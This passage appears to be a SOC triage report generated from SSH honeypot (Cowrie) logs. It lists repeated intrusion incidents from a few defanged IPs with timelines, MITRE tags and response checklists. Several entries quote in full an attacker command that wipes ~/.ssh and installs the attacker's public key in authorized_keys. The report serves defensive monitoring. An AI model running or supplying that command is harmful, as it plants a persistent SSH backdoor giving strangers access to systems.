| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-04-14 15:55 |
| **Last Seen** | 2026-04-14 15:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:55:16` | `cowrie.session.connect` |
| `2026-04-14 15:55:16` | `cowrie.client.version` |
| `2026-04-14 15:55:17` | `cowrie.client.kex` |
| `2026-04-14 15:55:17` | `cowrie.login.success` |
| `2026-04-14 15:55:18` | `cowrie.session.params` |
| `2026-04-14 15:55:18` | `cowrie.command.input` |
| `2026-04-14 15:55:18` | `cowrie.command.failed` |
| `2026-04-14 15:55:18` | `cowrie.log.closed` |
| `2026-04-14 15:55:18` | `cowrie.session.params` |
| `2026-04-14 15:55:18` | `cowrie.command.input` |
| `2026-04-14 15:55:18` | `cowrie.session.file_download` |
| `2026-04-14 15:55:18` | `cowrie.log.closed` |
| `2026-04-14 15:55:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e91d3720f52

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-04-14 15:55 |
| **Last Seen** | 2026-04-14 15:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:55:21` | `cowrie.session.connect` |
| `2026-04-14 15:55:21` | `cowrie.client.version` |
| `2026-04-14 15:55:21` | `cowrie.client.kex` |
| `2026-04-14 15:55:22` | `cowrie.login.success` |
| `2026-04-14 15:55:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2e190f982b7

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-04-14 15:57 |
| **Last Seen** | 2026-04-14 15:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:57:29` | `cowrie.session.connect` |
| `2026-04-14 15:57:29` | `cowrie.client.version` |
| `2026-04-14 15:57:30` | `cowrie.client.kex` |
| `2026-04-14 15:57:31` | `cowrie.login.success` |
| `2026-04-14 15:57:31` | `cowrie.session.params` |
| `2026-04-14 15:57:31` | `cowrie.command.input` |
| `2026-04-14 15:57:31` | `cowrie.command.failed` |
| `2026-04-14 15:57:31` | `cowrie.log.closed` |
| `2026-04-14 15:57:32` | `cowrie.session.params` |
| `2026-04-14 15:57:32` | `cowrie.command.input` |
| `2026-04-14 15:57:32` | `cowrie.session.file_download` |
| `2026-04-14 15:57:32` | `cowrie.log.closed` |
| `2026-04-14 15:57:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75872498b81b

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-04-14 15:57 |
| **Last Seen** | 2026-04-14 15:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:57:35` | `cowrie.session.connect` |
| `2026-04-14 15:57:35` | `cowrie.client.version` |
| `2026-04-14 15:57:35` | `cowrie.client.kex` |
| `2026-04-14 15:57:36` | `cowrie.login.success` |
| `2026-04-14 15:57:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0077f6f19ff

| Field | Detail |
|---|---|
| **Source IP** | `103.218.242[.]31` |
| **First Seen** | 2026-04-14 16:01 |
| **Last Seen** | 2026-04-14 16:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:01:25` | `cowrie.session.connect` |
| `2026-04-14 16:01:25` | `cowrie.client.version` |
| `2026-04-14 16:01:25` | `cowrie.client.kex` |
| `2026-04-14 16:01:25` | `cowrie.login.success` |
| `2026-04-14 16:01:25` | `cowrie.session.params` |
| `2026-04-14 16:01:25` | `cowrie.command.input` |
| `2026-04-14 16:01:25` | `cowrie.command.failed` |
| `2026-04-14 16:01:25` | `cowrie.log.closed` |
| `2026-04-14 16:01:26` | `cowrie.session.params` |
| `2026-04-14 16:01:26` | `cowrie.command.input` |
| `2026-04-14 16:01:26` | `cowrie.session.file_download` |
| `2026-04-14 16:01:26` | `cowrie.log.closed` |
| `2026-04-14 16:01:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.218.242[.]31` to AbuseIPDB if not already reported
- [ ] Block `103.218.242[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7ad99eb6f7e

| Field | Detail |
|---|---|
| **Source IP** | `103.218.242[.]31` |
| **First Seen** | 2026-04-14 16:01 |
| **Last Seen** | 2026-04-14 16:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:01:28` | `cowrie.session.connect` |
| `2026-04-14 16:01:28` | `cowrie.client.version` |
| `2026-04-14 16:01:28` | `cowrie.client.kex` |
| `2026-04-14 16:01:28` | `cowrie.login.success` |
| `2026-04-14 16:01:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.218.242[.]31` to AbuseIPDB if not already reported
- [ ] Block `103.218.242[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3645dbdf2303

| Field | Detail |
|---|---|
| **Source IP** | `103.218.242[.]31` |
| **First Seen** | 2026-04-14 16:03 |
| **Last Seen** | 2026-04-14 16:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:03:03` | `cowrie.session.connect` |
| `2026-04-14 16:03:03` | `cowrie.client.version` |
| `2026-04-14 16:03:03` | `cowrie.client.kex` |
| `2026-04-14 16:03:03` | `cowrie.login.success` |
| `2026-04-14 16:03:04` | `cowrie.session.params` |
| `2026-04-14 16:03:04` | `cowrie.command.input` |
| `2026-04-14 16:03:04` | `cowrie.command.failed` |
| `2026-04-14 16:03:04` | `cowrie.log.closed` |
| `2026-04-14 16:03:04` | `cowrie.session.params` |
| `2026-04-14 16:03:04` | `cowrie.command.input` |
| `2026-04-14 16:03:04` | `cowrie.session.file_download` |
| `2026-04-14 16:03:04` | `cowrie.log.closed` |
| `2026-04-14 16:03:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.218.242[.]31` to AbuseIPDB if not already reported
- [ ] Block `103.218.242[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7985773c43a

| Field | Detail |
|---|---|
| **Source IP** | `103.218.242[.]31` |
| **First Seen** | 2026-04-14 16:03 |
| **Last Seen** | 2026-04-14 16:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:03:06` | `cowrie.session.connect` |
| `2026-04-14 16:03:06` | `cowrie.client.version` |
| `2026-04-14 16:03:06` | `cowrie.client.kex` |
| `2026-04-14 16:03:06` | `cowrie.login.success` |
| `2026-04-14 16:03:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.218.242[.]31` to AbuseIPDB if not already reported
- [ ] Block `103.218.242[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1b322e0da77

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-04-14 16:04 |
| **Last Seen** | 2026-04-14 16:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:04:12` | `cowrie.session.connect` |
| `2026-04-14 16:04:12` | `cowrie.client.version` |
| `2026-04-14 16:04:12` | `cowrie.client.kex` |
| `2026-04-14 16:04:13` | `cowrie.login.success` |
| `2026-04-14 16:04:14` | `cowrie.session.params` |
| `2026-04-14 16:04:14` | `cowrie.command.input` |
| `2026-04-14 16:04:14` | `cowrie.command.failed` |
| `2026-04-14 16:04:14` | `cowrie.log.closed` |
| `2026-04-14 16:04:15` | `cowrie.session.params` |
| `2026-04-14 16:04:15` | `cowrie.command.input` |
| `2026-04-14 16:04:15` | `cowrie.session.file_download` |
| `2026-04-14 16:04:15` | `cowrie.log.closed` |
| `2026-04-14 16:04:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b5d09883536

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-04-14 16:04 |
| **Last Seen** | 2026-04-14 16:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:04:18` | `cowrie.session.connect` |
| `2026-04-14 16:04:18` | `cowrie.client.version` |
| `2026-04-14 16:04:18` | `cowrie.client.kex` |
| `2026-04-14 16:04:19` | `cowrie.login.success` |
| `2026-04-14 16:04:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7a7c05b94a0

| Field | Detail |
|---|---|
| **Source IP** | `124.70.68[.]216` |
| **First Seen** | 2026-04-14 16:04 |
| **Last Seen** | 2026-04-14 16:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:04:39` | `cowrie.session.connect` |
| `2026-04-14 16:04:39` | `cowrie.client.version` |
| `2026-04-14 16:04:40` | `cowrie.client.kex` |
| `2026-04-14 16:04:40` | `cowrie.login.success` |
| `2026-04-14 16:04:41` | `cowrie.session.params` |
| `2026-04-14 16:04:41` | `cowrie.command.input` |
| `2026-04-14 16:04:41` | `cowrie.command.failed` |
| `2026-04-14 16:04:41` | `cowrie.log.closed` |
| `2026-04-14 16:04:41` | `cowrie.session.params` |
| `2026-04-14 16:04:41` | `cowrie.command.input` |
| `2026-04-14 16:04:41` | `cowrie.session.file_download` |
| `2026-04-14 16:04:41` | `cowrie.log.closed` |
| `2026-04-14 16:04:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.70.68[.]216` to AbuseIPDB if not already reported
- [ ] Block `124.70.68[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1dae47fb21c

| Field | Detail |
|---|---|
| **Source IP** | `124.70.68[.]216` |
| **First Seen** | 2026-04-14 16:04 |
| **Last Seen** | 2026-04-14 16:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:04:43` | `cowrie.session.connect` |
| `2026-04-14 16:04:43` | `cowrie.client.version` |
| `2026-04-14 16:04:43` | `cowrie.client.kex` |
| `2026-04-14 16:04:44` | `cowrie.login.success` |
| `2026-04-14 16:04:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.70.68[.]216` to AbuseIPDB if not already reported
- [ ] Block `124.70.68[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b353056ed4ef

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-04-14 16:07 |
| **Last Seen** | 2026-04-14 16:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:07:38` | `cowrie.session.connect` |
| `2026-04-14 16:07:38` | `cowrie.client.version` |
| `2026-04-14 16:07:38` | `cowrie.client.kex` |
| `2026-04-14 16:07:39` | `cowrie.login.success` |
| `2026-04-14 16:07:40` | `cowrie.session.params` |
| `2026-04-14 16:07:40` | `cowrie.command.input` |
| `2026-04-14 16:07:40` | `cowrie.command.failed` |
| `2026-04-14 16:07:40` | `cowrie.log.closed` |
| `2026-04-14 16:07:41` | `cowrie.session.params` |
| `2026-04-14 16:07:41` | `cowrie.command.input` |
| `2026-04-14 16:07:41` | `cowrie.session.file_download` |
| `2026-04-14 16:07:41` | `cowrie.log.closed` |
| `2026-04-14 16:07:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0651b3392d6

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-04-14 16:07 |
| **Last Seen** | 2026-04-14 16:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:07:44` | `cowrie.session.connect` |
| `2026-04-14 16:07:44` | `cowrie.client.version` |
| `2026-04-14 16:07:44` | `cowrie.client.kex` |
| `2026-04-14 16:07:45` | `cowrie.login.success` |
| `2026-04-14 16:07:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea18faf87da0

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-04-14 16:09 |
| **Last Seen** | 2026-04-14 16:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:09:22` | `cowrie.session.connect` |
| `2026-04-14 16:09:22` | `cowrie.client.version` |
| `2026-04-14 16:09:22` | `cowrie.client.kex` |
| `2026-04-14 16:09:23` | `cowrie.login.success` |
| `2026-04-14 16:09:23` | `cowrie.session.params` |
| `2026-04-14 16:09:23` | `cowrie.command.input` |
| `2026-04-14 16:09:23` | `cowrie.command.failed` |
| `2026-04-14 16:09:23` | `cowrie.log.closed` |
| `2026-04-14 16:09:24` | `cowrie.session.params` |
| `2026-04-14 16:09:24` | `cowrie.command.input` |
| `2026-04-14 16:09:24` | `cowrie.session.file_download` |
| `2026-04-14 16:09:24` | `cowrie.log.closed` |
| `2026-04-14 16:09:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc6610d8002f

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-04-14 16:09 |
| **Last Seen** | 2026-04-14 16:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:09:27` | `cowrie.session.connect` |
| `2026-04-14 16:09:27` | `cowrie.client.version` |
| `2026-04-14 16:09:27` | `cowrie.client.kex` |
| `2026-04-14 16:09:28` | `cowrie.login.success` |
| `2026-04-14 16:09:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-419dc6e34355

| Field | Detail |
|---|---|
| **Source IP** | `103.218.242[.]31` |
| **First Seen** | 2026-04-14 16:12 |
| **Last Seen** | 2026-04-14 16:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:12:31` | `cowrie.session.connect` |
